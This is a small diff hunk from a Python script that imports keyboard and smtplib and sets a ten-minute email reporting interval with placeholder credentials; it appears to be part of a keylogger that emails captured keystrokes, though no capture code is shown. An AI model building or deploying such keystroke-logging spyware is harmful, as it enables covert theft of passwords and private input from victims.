@@ -2,7 +2,7 @@ import keyboard
 import smtplib
 from threading import Semaphore, Timer
 
-TIMING = 600 # YOu will receive report every 10 min.
+TIMING = 600 # You will receive report every 10 min. If you want CHANGE THIS
 EMAIL_ADDR = "your@mailaddress.com" #CHANGE THIS
 EMAIL_PASS = "YourMailPassword" #CHANGE THIS
 
